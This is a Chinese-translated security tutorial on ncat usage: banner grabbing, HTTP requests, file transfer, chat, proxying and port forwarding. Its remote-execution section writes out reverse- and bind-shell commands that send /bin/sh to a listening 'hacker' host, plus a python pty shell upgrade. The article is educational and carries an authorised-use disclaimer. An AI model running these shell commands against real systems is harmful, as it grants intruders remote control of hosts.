<html>
<head>
<title>Mastering Ncat for Fun and Profit</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">掌握Ncat的乐趣和利润</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/mastering-ncat-for-fun-and-profit-397e982b889c?source=collection_archive---------0-----------------------#2021-05-26">https://infosecwriteups.com/mastering-ncat-for-fun-and-profit-397e982b889c?source=collection_archive---------0-----------------------#2021-05-26</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="02d3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">实用ncat——命令、用法和实际应用</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kl"><img src="../Images/d1fa7bb1f52f2d14b00043d586bf743f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*Eyibb17N1iHh3Ad8"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">照片由<a class="ae lb" href="https://unsplash.com/@cookiethepom?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank">Cookie Pom</a>在<a class="ae lb" href="https://unsplash.com?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank"> Unsplash </a>拍摄</figcaption></figure><p id="b84c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">根据您对Unix操作系统的熟悉程度，您可能听说过内置的网络实用程序netcat —也被称为“<em class="lc">TCP/IP网络的瑞士军刀</em>”。</p><p id="f5af" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Netcat用于在网络上建立连接，并能够通过UDP或TCP协议传输数据。已经有几十篇关于该工具及其各种应用的优秀文章。然而，这一篇旨在阐明由<a class="ae lb" href="https://nmap.org/ncat/" rel="noopener ugc nofollow" target="_blank"> Nmap项目</a>ncat开发的现代重新实现！</p></div><div class="ab cl ld le hu lf" role="separator"><span class="lg bw bk lh li lj"/><span class="lg bw bk lh li lj"/><span class="lg bw bk lh li"/></div><div class="ij ik il im in"><h1 id="8e20" class="lk ll iq bd lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh bi translated">netcat vs. ncat vs. nc</h1><p id="311d" class="pw-post-body-paragraph jn jo iq jp b jq mi js jt ju mj jw jx jy mk ka kb kc ml ke kf kg mm ki kj kk ij bi translated">通常情况下，<code class="fe mn mo mp mq b">netcat</code>、<code class="fe mn mo mp mq b">ncat</code>和<code class="fe mn mo mp mq b">nc</code>是同义的，就好像它们是同一个工具。虽然它们执行相似的操作，但还是有一些关键的区别:</p><h2 id="5d13" class="mr ll iq bd lm ms mt dn lq mu mv dp lu jy mw mx ly kc my mz mc kg na nb mg nc bi translated"><strong class="ak">网猫</strong></h2><p id="51c0" class="pw-post-body-paragraph jn jo iq jp b jq mi js jt ju mj jw jx jy mk ka kb kc ml ke kf kg mm ki kj kk ij bi translated">Netcat是一个功能丰富的网络实用程序，由作者Hobbit于1996年创建。除了建立网络连接和传输数据，netcat还具有广泛的功能。</p><p id="53ef" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这些年来，netcat程序有过几次重写，比如那些由<a class="ae lb" href="http://netcat.sourceforge.net/" rel="noopener ugc nofollow" target="_blank"> GNU </a>和<a class="ae lb" href="https://man.openbsd.org/nc.1" rel="noopener ugc nofollow" target="_blank"> OpenBSD </a>编写的。每一个都旨在扩展核心功能和添加附加特性，即改进的隧道和/或IPv6支持。</p><h2 id="c6e1" class="mr ll iq bd lm ms mt dn lq mu mv dp lu jy mw mx ly kc my mz mc kg na nb mg nc bi translated">ncat</h2><p id="630d" class="pw-post-body-paragraph jn jo iq jp b jq mi js jt ju mj jw jx jy mk ka kb kc ml ke kf kg mm ki kj kk ij bi translated">如前所述，ncat是由<a class="ae lb" href="https://nmap.org/ncat/" rel="noopener ugc nofollow" target="_blank"> Nmap项目</a>开发的netcat的重新实现。根据该工具的公共<a class="ae lb" href="https://github.com/nmap/nmap/tree/master/ncat" rel="noopener ugc nofollow" target="_blank"> GitHub </a>库，ncat的创建是为了取代netcat的分散且合理的无人维护的家族。</p><p id="33ad" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">除了现代化的代码库和闪亮的新特性，ncat继续接受积极的、持续的开发工作。</p><h2 id="3817" class="mr ll iq bd lm ms mt dn lq mu mv dp lu jy mw mx ly kc my mz mc kg na nb mg nc bi translated"><strong class="ak">数控</strong></h2><p id="95e8" class="pw-post-body-paragraph jn jo iq jp b jq mi js jt ju mj jw jx jy mk ka kb kc ml ke kf kg mm ki kj kk ij bi translated">传统上，nc只是对系统上安装的原始netcat二进制文件的引用。这是通过符号链接映射的，也称为符号链接。</p><p id="af91" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然而，在本文的测试中，我发现这个符号链接参考可能会发生变化，或者被用户安装的软件包不知不觉地修改。例如，最新版本的<a class="ae lb" href="https://www.kali.org/" rel="noopener ugc nofollow" target="_blank"> Kali Linux </a>实际上是通过<code class="fe mn mo mp mq b">apt</code>将ncat安装在系统上时，将<code class="fe mn mo mp mq b">nc</code>命令链接到后来的<code class="fe mn mo mp mq b">ncat</code>二进制文件。</p></div><div class="ab cl ld le hu lf" role="separator"><span class="lg bw bk lh li lj"/><span class="lg bw bk lh li lj"/><span class="lg bw bk lh li"/></div><div class="ij ik il im in"><h1 id="89d3" class="lk ll iq bd lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh bi translated">关键CMD参数</h1><p id="45a0" class="pw-post-body-paragraph jn jo iq jp b jq mi js jt ju mj jw jx jy mk ka kb kc ml ke kf kg mm ki kj kk ij bi translated">下面是一些命令行参数，可以帮助您提高ncat的使用:</p><pre class="km kn ko kp gt nd mq ne nf aw ng bi"><span id="ccba" class="mr ll iq mq b gy nh ni l nj nk">-p               Specify port<br/>-l               Listen for incoming connections<br/>-k               keep open, allow multiple connections <br/>-n               Do not resolve host names via DNS            <br/>-v               Verbose output<br/>-c, --sh-exec<!-- -->    runs cmd by passing to a system shell<br/>-e, --exec<!-- -->       runs cmd without shell interpretation<br/>--ssl            Establish connection with SSL<br/>--chat           Start ncat chat server<br/>--allow &lt;IP&gt;     Only allow specified hosts to connect<br/>--deny &lt;IP&gt;      Prevent specific hosts from connecting<br/>--allowfile &lt;file&gt; Only allow hosts from file to connect<br/>--denyfile &lt;file&gt;  Prevent hosts in file from connecting</span></pre></div><div class="ab cl ld le hu lf" role="separator"><span class="lg bw bk lh li lj"/><span class="lg bw bk lh li lj"/><span class="lg bw bk lh li"/></div><div class="ij ik il im in"><h1 id="c0a9" class="lk ll iq bd lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh bi translated">网络连接和横幅抓取</h1><p id="e578" class="pw-post-body-paragraph jn jo iq jp b jq mi js jt ju mj jw jx jy mk ka kb kc ml ke kf kg mm ki kj kk ij bi translated">下面的例子演示了ncat的最基本用法，连接到远程服务。只需在命令行参数中添加目标<code class="fe mn mo mp mq b">IP address</code>和<code class="fe mn mo mp mq b">port</code>来建立连接。</p><p id="5167" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">根据服务的配置，可能会返回一个横幅，提供有关服务的详细信息，如供应商或当前版本。这可能会在通过<a class="ae lb" href="https://exploit-db.com/" rel="noopener ugc nofollow" target="_blank">exploit-db.com</a>等资源进行漏洞识别的安全测试中被滥用。</p><pre class="km kn ko kp gt nd mq ne nf aw ng bi"><span id="2296" class="mr ll iq mq b gy nh ni l nj nk">» $ ncat 192.168.1.7 21<br/>220 (vsFTPd 2.3.4)</span></pre></div><div class="ab cl ld le hu lf" role="separator"><span class="lg bw bk lh li lj"/><span class="lg bw bk lh li lj"/><span class="lg bw bk lh li"/></div><div class="ij ik il im in"><h1 id="09ce" class="lk ll iq bd lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh bi translated">制作HTTP请求</h1><p id="9660" class="pw-post-body-paragraph jn jo iq jp b jq mi js jt ju mj jw jx jy mk ka kb kc ml ke kf kg mm ki kj kk ij bi translated">其次，ncat可用于向web服务器发送定制的HTTP(S)请求。这可用于故障排除、验证连通性，或在安全测试期间修改请求以查找异常响应。</p><pre class="km kn ko kp gt nd mq ne nf aw ng bi"><span id="9b88" class="mr ll iq mq b gy nh ni l nj nk">» $ ncat --ssl google.com 443<br/>GET / HTTP/1.1<br/>Host: google.com<br/></span><span id="1012" class="mr ll iq mq b gy nl ni l nj nk">HTTP/1.1 301 Moved Permanently<br/>Location: <a class="ae lb" href="https://www.google.com/" rel="noopener ugc nofollow" target="_blank">https://www.google.com/</a><br/>Content-Type: text/html; charset=UTF-8<br/>Cache-Control: public, max-age=2592000<br/>Server: gws<br/>Content-Length: 220</span></pre></div><div class="ab cl ld le hu lf" role="separator"><span class="lg bw bk lh li lj"/><span class="lg bw bk lh li lj"/><span class="lg bw bk lh li"/></div><div class="ij ik il im in"><h1 id="070e" class="lk ll iq bd lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh bi translated">传输文件</h1><p id="b01b" class="pw-post-body-paragraph jn jo iq jp b jq mi js jt ju mj jw jx jy mk ka kb kc ml ke kf kg mm ki kj kk ij bi translated">在众多酷而有用的特性中，ncat提供了在两个远程系统之间传输文件的能力。为此，在您的服务器或发送主机上设置一个ncat监听器，并读入目标文件的内容作为标准输入。</p><p id="2265" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">下面显示的<code class="fe mn mo mp mq b">--send-only</code>参数表示在将所有数据传输到客户端后应该关闭连接。</p><pre class="km kn ko kp gt nd mq ne nf aw ng bi"><span id="f691" class="mr ll iq mq b gy nh ni l nj nk">(Server) » $ echo 'My awesome file!' &gt; shared_file.txt<br/>(Server) » $ ncat <!-- -->--send-only<strong class="mq ir"> </strong>-lp 80 &lt; shared_file.txt</span></pre><p id="1443" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在客户端或接收主机上，只需在连接过程中将ncat输出重定向到一个文件。一旦传输完成，<code class="fe mn mo mp mq b">--recv-only</code>参数将关闭连接。</p><pre class="km kn ko kp gt nd mq ne nf aw ng bi"><span id="1917" class="mr ll iq mq b gy nh ni l nj nk">(Client) » $ ncat <!-- -->--recv-only <!-- -->127.0.0.1 80 &gt; shared_file.txt<br/>(Client) » $ cat shared_file.txt<br/>My awesome file!</span></pre><p id="cb3d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="lc">害怕有人通过不安全的渠道获取您的数据？</em></p><p id="badc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">与演示的许多命令一样，ncat通过向客户机和服务器添加<code class="fe mn mo mp mq b">--ssl</code>参数来支持传输过程中的SSL加密。</p></div><div class="ab cl ld le hu lf" role="separator"><span class="lg bw bk lh li lj"/><span class="lg bw bk lh li lj"/><span class="lg bw bk lh li"/></div><div class="ij ik il im in"><h1 id="5e71" class="lk ll iq bd lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh bi translated">网络服务器</h1><p id="f354" class="pw-post-body-paragraph jn jo iq jp b jq mi js jt ju mj jw jx jy mk ka kb kc ml ke kf kg mm ki kj kk ij bi translated">下面演示了ncat被用作web服务器来托管本地<code class="fe mn mo mp mq b">index.html</code>。注意命令行参数中的<code class="fe mn mo mp mq b">-k</code>开关——这表示服务器应该保持监听并接受多个客户端连接。</p><pre class="km kn ko kp gt nd mq ne nf aw ng bi"><span id="b275" class="mr ll iq mq b gy nh ni l nj nk">» $ ncat -lk -p 80 -c "echo -e 'HTTP/1.1 200 OK\r\n';cat index.html"</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi nm"><img src="../Images/09e51b6aaa49f5088eb68295e0c061b3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*kGN_Koj3nEIcWMb7nWh0pw.png"/></div></div></figure></div><div class="ab cl ld le hu lf" role="separator"><span class="lg bw bk lh li lj"/><span class="lg bw bk lh li lj"/><span class="lg bw bk lh li"/></div><div class="ij ik il im in"><h1 id="aeb1" class="lk ll iq bd lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh bi translated">SSL加密群聊</h1><p id="bf5e" class="pw-post-body-paragraph jn jo iq jp b jq mi js jt ju mj jw jx jy mk ka kb kc ml ke kf kg mm ki kj kk ij bi translated">Ncat的聊天功能允许多个用户通过网络进行协作。为此，设置一个标准的SSL监听器并添加<code class="fe mn mo mp mq b">--chat</code>参数。该系统将被视为主持对话的聊天服务器。</p><pre class="km kn ko kp gt nd mq ne nf aw ng bi"><span id="4db8" class="mr ll iq mq b gy nh ni l nj nk">(Server) » $ ncat --ssl -lp 4443 --chat</span></pre><p id="54e5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">后续客户端可以连接到主机，并使用主机名、端口和<code class="fe mn mo mp mq b">--ssl</code>参数与其他用户交互:</p><pre class="km kn ko kp gt nd mq ne nf aw ng bi"><span id="e31b" class="mr ll iq mq b gy nh ni l nj nk">(Client 1) » $ ncat 10.0.0.1 4443 --ssl<br/>&lt;announce&gt; 10.0.0.2 is connected as &lt;user5&gt;.<br/>&lt;announce&gt; 10.0.0.3 is connected as &lt;user6&gt;.<br/>Hi Chat!</span></pre><p id="e856" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如图所示，ncat支持多用户连接:</p><pre class="km kn ko kp gt nd mq ne nf aw ng bi"><span id="2579" class="mr ll iq mq b gy nh ni l nj nk">(Client 2) » $ ncat 10.0.0.1 4443 --ssl<br/>&lt;announce&gt; 10.0.0.3 is connected as &lt;user6&gt;.<br/>&lt;user5&gt; Hi Chat!</span></pre></div><div class="ab cl ld le hu lf" role="separator"><span class="lg bw bk lh li lj"/><span class="lg bw bk lh li lj"/><span class="lg bw bk lh li"/></div><div class="ij ik il im in"><h1 id="7852" class="lk ll iq bd lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh bi translated">远程命令执行</h1><p id="44fa" class="pw-post-body-paragraph jn jo iq jp b jq mi js jt ju mj jw jx jy mk ka kb kc ml ke kf kg mm ki kj kk ij bi translated">Ncat使得在建立连接后启动远程命令变得容易。这可以通过在命令后添加<code class="fe mn mo mp mq b">-e</code>或<code class="fe mn mo mp mq b">—-exec</code>参数来实现。</p><p id="f171" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ncat的许多官方文档都用例子展示了这种功能，例如:<code class="fe mn mo mp mq b">ncat -l 23 -e "/bin/echo Hello”</code>。但是，这可以适应目标系统上的完整远程外壳。</p><h2 id="bf56" class="mr ll iq bd lm ms mt dn lq mu mv dp lu jy mw mx ly kc my mz mc kg na nb mg nc bi translated">反向外壳</h2><p id="9298" class="pw-post-body-paragraph jn jo iq jp b jq mi js jt ju mj jw jx jy mk ka kb kc ml ke kf kg mm ki kj kk ij bi translated">用ncat演示的第一种壳被称为<strong class="jp ir">反向壳</strong>。这需要攻击者设置一个标准的监听器并等待传入的连接。</p><pre class="km kn ko kp gt nd mq ne nf aw ng bi"><span id="178b" class="mr ll iq mq b gy nh ni l nj nk">(Hacker) » $ ncat -lp 80</span></pre><p id="4534" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">客户端或目标然后连接回攻击者，同时转发一个<code class="fe mn mo mp mq b">/bin/sh</code> shell。这将授予监听主机执行完整命令的权限。<br/> <strong class="jp ir"> <em class="lc">注意</em> </strong>:从Windows目标尝试时需要<code class="fe mn mo mp mq b">-e cmd.exe</code>。</p><pre class="km kn ko kp gt nd mq ne nf aw ng bi"><span id="1e4f" class="mr ll iq mq b gy nh ni l nj nk">(Target) » $ ncat 10.0.0.1 80 -e /bin/sh</span></pre><p id="43e7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在传入网络流量受到限制的情况下，或者使用绑定外壳公开监听端口风险太大的情况下，例如在外部网络上，反向外壳非常有用。</p><h2 id="de48" class="mr ll iq bd lm ms mt dn lq mu mv dp lu jy mw mx ly kc my mz mc kg na nb mg nc bi translated">绑定外壳</h2><p id="a330" class="pw-post-body-paragraph jn jo iq jp b jq mi js jt ju mj jw jx jy mk ka kb kc ml ke kf kg mm ki kj kk ij bi translated">如前所述，使用ncat获得远程命令执行的第二种方法是通过<strong class="jp ir">绑定外壳</strong>。这并不要求攻击者配置ncat监听器。相反，这一职责落在目标上，即配置一个侦听器并提供对连接客户端的访问。</p><p id="c68a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如下所示，目标系统使用<code class="fe mn mo mp mq b">-e</code>参数创建一个标准的ncat监听器来转发<code class="fe mn mo mp mq b">/bin/sh</code> shell。</p><pre class="km kn ko kp gt nd mq ne nf aw ng bi"><span id="67fe" class="mr ll iq mq b gy nh ni l nj nk">(Target) » $ ncat -lp 80 -e /bin/sh</span></pre><p id="14bd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，攻击者连接到目标，并被授予完全远程执行命令的权限。</p><pre class="km kn ko kp gt nd mq ne nf aw ng bi"><span id="f2e1" class="mr ll iq mq b gy nh ni l nj nk">(Hacker) » $ ncat 127.0.0.1 80</span></pre><p id="2064" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在攻击者直接连接到目标的情况下，bind shell非常有用。但是，在执行此方法时要小心，因为它会使主机易受攻击，并允许访问任何连接客户端的<strong class="jp ir">。</strong></p><h2 id="529c" class="mr ll iq bd lm ms mt dn lq mu mv dp lu jy mw mx ly kc my mz mc kg na nb mg nc bi translated">升级ncat shell (TTY)</h2><p id="332a" class="pw-post-body-paragraph jn jo iq jp b jq mi js jt ju mj jw jx jy mk ka kb kc ml ke kf kg mm ki kj kk ij bi translated">用ncat反转和绑定炮弹是在目标上获得第一个立足点的简单方法。但是，您可能会发现shell本身有局限性。缺乏作业控制意味着一次意外的“Ctrl+C”，你将需要重新开始。更不用说没有自动完成和有限的命令支持。</p><p id="2da8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了帮助解决这些问题，基于可用的服务，可以执行特定的<a class="ae lb" href="https://netsec.ws/?p=337" rel="noopener ugc nofollow" target="_blank">命令</a>，以生成完全交互式的TTY外壳。这将提供额外的功能和更多我们在Unix终端中习惯的舒适特性。</p><p id="2079" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><code class="fe mn mo mp mq b">python3 -c ‘import pty; pty.spawn(“/bin/bash”)’</code></p><p id="c2cf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">前面的命令只是我们如何从<code class="fe mn mo mp mq b">/bin/sh</code>升级到<code class="fe mn mo mp mq b">/bin/bash</code>并使用系统自己的<code class="fe mn mo mp mq b">python3</code>解释器和<code class="fe mn mo mp mq b">pty</code>库生成TTY外壳的一个例子。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi nn"><img src="../Images/80dca7461b90873678a5092cbfbb9f2a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1130/format:webp/1*YFhZIX85nEZKqEvXO8nbfQ.png"/></div></figure></div><div class="ab cl ld le hu lf" role="separator"><span class="lg bw bk lh li lj"/><span class="lg bw bk lh li lj"/><span class="lg bw bk lh li"/></div><div class="ij ik il im in"><h1 id="fc55" class="lk ll iq bd lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh bi translated">Ncat通过代理</h1><p id="8590" class="pw-post-body-paragraph jn jo iq jp b jq mi js jt ju mj jw jx jy mk ka kb kc ml ke kf kg mm ki kj kk ij bi translated">Ncat可以很容易地通过一个代理来运行，方法是添加<code class="fe mn mo mp mq b">--proxy</code>参数，后跟<code class="fe mn mo mp mq b">&lt;proxy-host&gt;:&lt;proxy-port&gt;</code>。该方法支持<code class="fe mn mo mp mq b">http</code>和<code class="fe mn mo mp mq b">socks</code>选项，以及使用<code class="fe mn mo mp mq b">--proxy-auth</code>参数的认证。</p><pre class="km kn ko kp gt nd mq ne nf aw ng bi"><span id="3f0f" class="mr ll iq mq b gy nh ni l nj nk">» $ ssh -N -D 9000 root@<!-- -->192.168.1<!-- -->.1<br/>root@<!-- -->192.168.1<!-- -->.1’s password:</span></pre><p id="f49e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">以下示例演示了在通过之前创建的<code class="fe mn mo mp mq b">socks4</code>代理路由流量之后，SSH服务在<code class="fe mn mo mp mq b">192.168.1.25</code>的横幅抓取:</p><pre class="km kn ko kp gt nd mq ne nf aw ng bi"><span id="8485" class="mr ll iq mq b gy nh ni l nj nk">» $ ncat --proxy localhost:9000 --proxy-type socks4 192.168.1.25 22<br/>SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1</span></pre></div><div class="ab cl ld le hu lf" role="separator"><span class="lg bw bk lh li lj"/><span class="lg bw bk lh li lj"/><span class="lg bw bk lh li"/></div><div class="ij ik il im in"><h1 id="e794" class="lk ll iq bd lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh bi translated">服务端口转发</h1><p id="3303" class="pw-post-body-paragraph jn jo iq jp b jq mi js jt ju mj jw jx jy mk ka kb kc ml ke kf kg mm ki kj kk ij bi translated">最后一个实际例子是使用ncat来转发目标服务的端口。当试图访问由于网络限制而不可用的服务时，可以使用这种技术。</p><p id="26c7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">下面通过让端口<code class="fe mn mo mp mq b">222</code>上的本地主机可以访问<code class="fe mn mo mp mq b">192.168.1.12:22</code>上的SSH服务来演示使用ncat的端口转发:</p><pre class="km kn ko kp gt nd mq ne nf aw ng bi"><span id="a6ef" class="mr ll iq mq b gy nh ni l nj nk">» $ ncat -klvp 222 -c "ncat -v 192.168.1.12 22"<br/>Ncat: Version 7.91 ( <a class="ae lb" href="https://nmap.org/ncat" rel="noopener ugc nofollow" target="_blank">https://nmap.org/ncat</a> )<br/>Ncat: Listening on :::222<br/>Ncat: Listening on 0.0.0.0:222</span></pre><p id="cf0a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，为了连接远程服务，启动一个到转发位置的新SSH连接，如下所示:</p><pre class="km kn ko kp gt nd mq ne nf aw ng bi"><span id="f45b" class="mr ll iq mq b gy nh ni l nj nk">» $ssh root@127.0.0.1 -p 222<br/>root@127.0.0.1's password:<br/>root@kali:~$ </span></pre></div><div class="ab cl ld le hu lf" role="separator"><span class="lg bw bk lh li lj"/><span class="lg bw bk lh li lj"/><span class="lg bw bk lh li"/></div><div class="ij ik il im in"><p id="6976" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">感谢阅读！在<a class="ae lb" href="https://m8sec.dev" rel="noopener ugc nofollow" target="_blank"> m8sec.dev </a>了解更多关于我的信息，并关注更多安全内容。</p><div class="no np gp gr nq nr"><a href="https://nmap.org/ncat/" rel="noopener  ugc nofollow" target="_blank"><div class="ns ab fo"><div class="nt ab nu cl cj nv"><h2 class="bd ir gy z fp nw fr fs nx fu fw ip bi translated">21世纪的Ncat - Netcat</h2><div class="ny l"><h3 class="bd b gy z fp nw fr fs nx fu fw dk translated">Ncat是一个功能丰富的网络实用程序，可以从命令行通过网络读写数据。Ncat是…</h3></div><div class="nz l"><p class="bd b dl z fp nw fr fs nx fu fw dk translated">nmap.org</p></div></div><div class="oa l"><div class="ob l oc od oe oa of kv nr"/></div></div></a></div><div class="no np gp gr nq nr"><a href="https://github.com/nmap/nmap/tree/master/ncat" rel="noopener  ugc nofollow" target="_blank"><div class="ns ab fo"><div class="nt ab nu cl cj nv"><h2 class="bd ir gy z fp nw fr fs nx fu fw ip bi translated">nmap/nmap</h2><div class="ny l"><h3 class="bd b gy z fp nw fr fs nx fu fw dk translated">网络映射器。SVN官方知识库的Github镜像。- nmap/nmap</h3></div><div class="nz l"><p class="bd b dl z fp nw fr fs nx fu fw dk translated">github.com</p></div></div><div class="oa l"><div class="og l oc od oe oa of kv nr"/></div></div></a></div><p id="33b8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="lc">免责声明:所有内容仅用于教育目的。作者不对信息的使用负责。不要对你不拥有或没有明确许可的系统进行测试。</em></p></div></div>    
</body>
</html>